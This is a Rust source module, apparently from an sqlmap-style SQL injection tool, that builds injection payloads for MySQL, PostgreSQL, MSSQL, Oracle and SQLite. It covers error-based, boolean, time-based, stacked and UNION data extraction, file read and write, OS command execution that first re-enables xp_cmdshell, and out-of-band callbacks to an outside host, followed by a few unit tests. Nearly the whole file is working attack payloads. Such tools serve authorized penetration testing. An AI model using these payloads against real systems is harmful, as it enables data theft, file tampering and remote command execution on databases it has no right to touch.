//! Payload generation for SQL injection detection and exploitation.
//!
//! Organized by technique and DBMS. Each function returns payloads
//! filtered by level (1-5) and risk (1-3).

use super::dbms::Dbms;

// ---------------------------------------------------------------------------
// Boundary probes — initial injection point discovery
// ---------------------------------------------------------------------------

/// Generate boundary probes for error-based detection.
/// Higher levels include more aggressive payloads.
pub fn boundary_probes(level: u8) -> Vec<String> {
    let mut probes = Vec::new();

    // Level 1: basic quote/escape characters
    probes.extend([
        "'".to_string(),
        "\"".to_string(),
        "\\".to_string(),
        "'--".to_string(),
        "\"--".to_string(),
    ]);

    if level >= 2 {
        probes.extend([
            "')".to_string(),
            "\")".to_string(),
            "'))".to_string(),
            "\"))".to_string(),
            "' OR '1'='1".to_string(),
            "\" OR \"1\"=\"1".to_string(),
            "') OR ('1'='1".to_string(),
            "1' ORDER BY 1--".to_string(),
            "1\" ORDER BY 1--".to_string(),
        ]);
    }

    if level >= 3 {
        probes.extend([
            "1 AND 1=1".to_string(),
            "1 AND 1=2".to_string(),
            "1' AND '1'='1".to_string(),
            "1' AND '1'='2".to_string(),
            "1) AND (1=1".to_string(),
            "1) AND (1=2".to_string(),
            "1')) AND (('1'='1".to_string(),
            "' UNION SELECT NULL--".to_string(),
            "' UNION SELECT NULL,NULL--".to_string(),
            "%27".to_string(),
            "%22".to_string(),
        ]);
    }

    if level >= 4 {
        probes.extend([
            "1' AND '1'='1' /*".to_string(),
            "1' AND '1'='2' /*".to_string(),
            "') UNION SELECT NULL--".to_string(),
            "')) UNION SELECT NULL--".to_string(),
            "' OR 1=1#".to_string(),
            "' OR 1=1/*".to_string(),
            "admin'--".to_string(),
            "1;".to_string(),
            "1';".to_string(),
        ]);
    }

    if level >= 5 {
        probes.extend([
            "1 WAITFOR DELAY '0:0:1'--".to_string(),
            "1; WAITFOR DELAY '0:0:1'--".to_string(),
            "1' WAITFOR DELAY '0:0:1'--".to_string(),
            "1 AND SLEEP(1)--".to_string(),
            "1' AND SLEEP(1)--".to_string(),
            "1; SELECT pg_sleep(1)--".to_string(),
            "1' AND (SELECT * FROM (SELECT SLEEP(1))a)--".to_string(),
        ]);
    }

    probes
}

// ---------------------------------------------------------------------------
// Error extraction payloads
// ---------------------------------------------------------------------------

/// Generate payloads that extract data via DBMS error messages.
pub fn error_extraction_payloads(dbms: Dbms, expression: &str) -> Vec<String> {
    match dbms {
        Dbms::MySQL | Dbms::MariaDB => vec![
            format!("' AND EXTRACTVALUE(1,CONCAT(0x7e,({expression}),0x7e))--"),
            format!("' AND UPDATEXML(1,CONCAT(0x7e,({expression}),0x7e),1)--"),
            format!("' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(({expression}),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"),
            format!("' AND EXP(~(SELECT * FROM (SELECT ({expression}))a))--"),
            format!("' AND GTID_SUBSET(({expression}),0)--"),
        ],
        Dbms::PostgreSQL => vec![
            format!("' AND CAST(({expression}) AS INT)--"),
            format!("' AND 1=CAST(({expression}) AS INT)--"),
            format!("' AND ({expression})::int=1--"),
        ],
        Dbms::MSSQL => vec![
            format!("' AND 1=CONVERT(INT,({expression}))--"),
            format!("' AND 1=CAST(({expression}) AS INT)--"),
            format!("' AND 1=(SELECT TOP 1 CAST(({expression}) AS VARCHAR(8000)))--"),
        ],
        Dbms::Oracle => vec![
            format!("' AND 1=CTXSYS.DRITHSX.SN(1,({expression}))--"),
            format!("' AND 1=UTL_INADDR.GET_HOST_NAME(({expression}))--"),
            format!("' AND CAST(({expression}) AS INT)=1--"),
        ],
        _ => vec![
            format!("' AND CAST(({expression}) AS INT)--"),
        ],
    }
}

// ---------------------------------------------------------------------------
// Boolean pair payloads
// ---------------------------------------------------------------------------

/// Generate true/false payload pairs for boolean-based blind detection.
pub fn boolean_pairs(dbms: Dbms, level: u8, risk: u8) -> Vec<(String, String)> {
    let mut pairs = Vec::new();

    // Level 1: basic AND conditions
    pairs.push(("' AND '1'='1".to_string(), "' AND '1'='2".to_string()));
    pairs.push(("' AND 1=1--".to_string(), "' AND 1=2--".to_string()));
    pairs.push(("\" AND \"1\"=\"1".to_string(), "\" AND \"1\"=\"2".to_string()));

    if level >= 2 {
        pairs.push(("') AND ('1'='1".to_string(), "') AND ('1'='2".to_string()));
        pairs.push(("')) AND (('1'='1".to_string(), "')) AND (('1'='2".to_string()));
        pairs.push(("' AND 2>1--".to_string(), "' AND 2<1--".to_string()));
        pairs.push(("') AND 2>1--".to_string(), "') AND 2<1--".to_string()));
    }

    if level >= 3 {
        pairs.push(("1 AND 1=1".to_string(), "1 AND 1=2".to_string()));
        pairs.push(("1) AND (1=1".to_string(), "1) AND (1=2".to_string()));
        pairs.push((
            format!("' AND {}--", dbms_specific_true(dbms)),
            format!("' AND {}--", dbms_specific_false(dbms)),
        ));
    }

    // Risk 2+: OR-based payloads (may alter query results)
    if risk >= 2 {
        pairs.push(("' OR '1'='1".to_string(), "' OR '1'='2".to_string()));
        if level >= 2 {
            pairs.push(("') OR ('1'='1".to_string(), "') OR ('1'='2".to_string()));
        }
    }

    pairs
}

fn dbms_specific_true(dbms: Dbms) -> &'static str {
    match dbms {
        Dbms::MySQL | Dbms::MariaDB => "LENGTH('a')=1",
        Dbms::PostgreSQL => "LENGTH('a')=1",
        Dbms::MSSQL => "LEN('a')=1",
        Dbms::Oracle => "LENGTH('a')=1",
        _ => "1=1",
    }
}

fn dbms_specific_false(dbms: Dbms) -> &'static str {
    match dbms {
        Dbms::MySQL | Dbms::MariaDB => "LENGTH('a')=2",
        Dbms::PostgreSQL => "LENGTH('a')=2",
        Dbms::MSSQL => "LEN('a')=2",
        Dbms::Oracle => "LENGTH('a')=2",
        _ => "1=2",
    }
}

// ---------------------------------------------------------------------------
// Time-based payloads
// ---------------------------------------------------------------------------

/// Generate time-based blind detection payloads.
pub fn time_payloads(dbms: Dbms, delay: u32, level: u8) -> Vec<String> {
    let mut payloads = Vec::new();

    match dbms {
        Dbms::MySQL | Dbms::MariaDB => {
            payloads.push(format!("' AND SLEEP({delay})--"));
            payloads.push(format!("' AND (SELECT SLEEP({delay}))--"));
            if level >= 2 {
                payloads.push(format!("') AND SLEEP({delay})--"));
                payloads.push(format!("')) AND SLEEP({delay})--"));
                payloads.push(format!("' AND BENCHMARK(5000000,SHA1('test'))--"));
                payloads.push(format!("' AND (SELECT * FROM (SELECT SLEEP({delay}))a)--"));
            }
            if level >= 3 {
                payloads.push(format!("1 AND SLEEP({delay})"));
                payloads.push(format!("1) AND SLEEP({delay})--"));
                payloads.push(format!("\" AND SLEEP({delay})--"));
            }
        }
        Dbms::PostgreSQL => {
            payloads.push(format!("'; SELECT pg_sleep({delay})--"));
            payloads.push(format!("' AND (SELECT pg_sleep({delay}))::text=''--"));
            if level >= 2 {
                payloads.push(format!("'); SELECT pg_sleep({delay})--"));
                payloads.push(format!("' || pg_sleep({delay})--"));
            }
        }
        Dbms::MSSQL => {
            payloads.push(format!("'; WAITFOR DELAY '0:0:{delay}'--"));
            payloads.push(format!("' WAITFOR DELAY '0:0:{delay}'--"));
            if level >= 2 {
                payloads.push(format!("'); WAITFOR DELAY '0:0:{delay}'--"));
                payloads.push(format!("1; WAITFOR DELAY '0:0:{delay}'--"));
            }
        }
        Dbms::Oracle => {
            payloads.push(format!(
                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66),{delay})--"
            ));
            if level >= 2 {
                payloads.push(format!(
                    "') AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66),{delay})--"
                ));
            }
        }
        Dbms::SQLite => {
            payloads.push(format!(
                "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({delay}00000000/2))))--"
            ));
            if level >= 2 {
                payloads.push(format!(
                    "') AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({delay}00000000/2))))--"
                ));
            }
        }
        _ => {
            // Generic fallback
            payloads.push(format!("' AND SLEEP({delay})--"));
            payloads.push(format!("'; WAITFOR DELAY '0:0:{delay}'--"));
        }
    }

    payloads
}

// ---------------------------------------------------------------------------
// Stacked query payloads
// ---------------------------------------------------------------------------

/// Generate stacked query probes (semicolon-separated statements).
pub fn stacked_probes(dbms: Dbms, delay: u32, level: u8) -> Vec<String> {
    let mut probes = Vec::new();

    match dbms {
        Dbms::MSSQL => {
            probes.push(format!("'; WAITFOR DELAY '0:0:{delay}'--"));
            if level >= 2 {
                probes.push(format!("'); WAITFOR DELAY '0:0:{delay}'--"));
                probes.push(format!("1; WAITFOR DELAY '0:0:{delay}'--"));
            }
        }
        Dbms::PostgreSQL => {
            probes.push(format!("'; SELECT pg_sleep({delay})--"));
            if level >= 2 {
                probes.push(format!("'); SELECT pg_sleep({delay})--"));
                probes.push(format!("1; SELECT pg_sleep({delay})--"));
            }
        }
        Dbms::MySQL | Dbms::MariaDB => {
            probes.push(format!("'; SELECT SLEEP({delay})--"));
            if level >= 2 {
                probes.push(format!("'); SELECT SLEEP({delay})--"));
            }
        }
        _ => {
            probes.push(format!("'; SELECT SLEEP({delay})--"));
        }
    }

    probes
}

// ---------------------------------------------------------------------------
// ORDER BY probes for column count detection
// ---------------------------------------------------------------------------

/// Generate ORDER BY N probes for UNION column count detection.
pub fn order_by_probes(max_columns: usize) -> Vec<(usize, String)> {
    (1..=max_columns)
        .map(|n| (n, format!("ORDER BY {n}")))
        .collect()
}

// ---------------------------------------------------------------------------
// UNION SELECT payloads
// ---------------------------------------------------------------------------

/// Generate UNION SELECT payloads with a marker at each column position
/// to find which column is visible in the response.
pub fn union_marker_payloads(
    dbms: Dbms,
    column_count: usize,
    marker: &str,
) -> Vec<(usize, String)> {
    let from = dbms.from_dummy();
    let mut payloads = Vec::new();

    for pos in 0..column_count {
        let columns: Vec<String> = (0..column_count)
            .map(|i| {
                if i == pos {
                    format!("'{marker}'")
                } else {
                    "NULL".to_string()
                }
            })
            .collect();

        payloads.push((
            pos,
            format!("UNION ALL SELECT {}{from}", columns.join(",")),
        ));
    }

    payloads
}

/// Generate a UNION SELECT payload that extracts data through the visible column.
pub fn union_extract_payload(
    dbms: Dbms,
    column_count: usize,
    visible_col: usize,
    expression: &str,
    marker: &str,
) -> String {
    let from = dbms.from_dummy();
    let concat_expr = dbms.concat(
        &dbms.concat(&format!("'{marker}'"), &format!("({expression})")),
        &format!("'{marker}'"),
    );

    let columns: Vec<String> = (0..column_count)
        .map(|i| {
            if i == visible_col {
                concat_expr.clone()
            } else {
                "NULL".to_string()
            }
        })
        .collect();

    format!("UNION ALL SELECT {}{from}", columns.join(","))
}

// ---------------------------------------------------------------------------
// File read/write payloads
// ---------------------------------------------------------------------------

/// Generate payloads for reading files via SQL injection.
pub fn file_read_payloads(dbms: Dbms, path: &str) -> Vec<String> {
    match dbms.file_read_expr(path) {
        Some(expr) => vec![expr],
        None => Vec::new(),
    }
}

/// Generate payloads for writing files via SQL injection.
pub fn file_write_payloads(dbms: Dbms, path: &str, content: &str) -> Vec<String> {
    match dbms.file_write_sql(path, content) {
        Some(sql) => vec![sql],
        None => Vec::new(),
    }
}

// ---------------------------------------------------------------------------
// OS command execution payloads
// ---------------------------------------------------------------------------

/// Generate payloads for OS command execution via SQL injection.
pub fn os_cmd_payloads(dbms: Dbms, command: &str) -> Vec<String> {
    let mut payloads = Vec::new();

    if let Some(sql) = dbms.os_cmd_sql(command) {
        payloads.push(sql);
    }

    // MSSQL: try enabling xp_cmdshell first if it's disabled
    if dbms == Dbms::MSSQL {
        payloads.insert(
            0,
            format!(
                "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC master..xp_cmdshell '{command}'"
            ),
        );
    }

    payloads
}

// ---------------------------------------------------------------------------
// OAST (Out-of-band) payloads
// ---------------------------------------------------------------------------

/// Generate out-of-band DNS callback payloads for blind confirmation.
pub fn oast_payloads(dbms: Dbms, token: &str, oast_host: &str) -> Vec<String> {
    let callback = format!("{token}.{oast_host}");
    match dbms {
        Dbms::MySQL | Dbms::MariaDB => vec![
            format!("' AND LOAD_FILE('\\\\\\\\{callback}\\\\a')--"),
            format!("' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',({token}),'.{oast_host}\\\\a')))--"),
        ],
        Dbms::MSSQL => vec![
            format!("'; EXEC master..xp_dirtree '\\\\{callback}\\a'--"),
            format!("'; EXEC master..xp_subdirs '\\\\{callback}\\a'--"),
        ],
        Dbms::PostgreSQL => vec![
            format!("'; COPY (SELECT '') TO PROGRAM 'nslookup {callback}'--"),
        ],
        Dbms::Oracle => vec![
            format!("' AND 1=UTL_HTTP.REQUEST('http://{callback}/')--"),
            format!("' AND SYS.DBMS_LDAP.INIT(('{callback}'),80) IS NOT NULL--"),
        ],
        _ => Vec::new(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn boundary_probes_increase_with_level() {
        let l1 = boundary_probes(1);
        let l3 = boundary_probes(3);
        let l5 = boundary_probes(5);
        assert!(l3.len() > l1.len());
        assert!(l5.len() > l3.len());
    }

    #[test]
    fn boolean_pairs_increase_with_level_and_risk() {
        let p11 = boolean_pairs(Dbms::MySQL, 1, 1);
        let p21 = boolean_pairs(Dbms::MySQL, 2, 1);
        let p12 = boolean_pairs(Dbms::MySQL, 1, 2);
        assert!(p21.len() > p11.len());
        assert!(p12.len() > p11.len());
    }

    #[test]
    fn time_payloads_per_dbms() {
        for dbms in [Dbms::MySQL, Dbms::PostgreSQL, Dbms::MSSQL, Dbms::Oracle, Dbms::SQLite] {
            let pls = time_payloads(dbms, 5, 1);
            assert!(!pls.is_empty(), "no time payloads for {dbms}");
        }
    }

    #[test]
    fn union_marker_payloads_correct_count() {
        let pls = union_marker_payloads(Dbms::MySQL, 5, "MARKER");
        assert_eq!(pls.len(), 5);
        assert!(pls[2].1.contains("MARKER"));
    }

    #[test]
    fn oast_payloads_not_empty() {
        for dbms in [Dbms::MySQL, Dbms::MSSQL, Dbms::PostgreSQL, Dbms::Oracle] {
            let pls = oast_payloads(dbms, "tok123", "callback.test");
            assert!(!pls.is_empty(), "no OAST payloads for {dbms}");
        }
    }
}
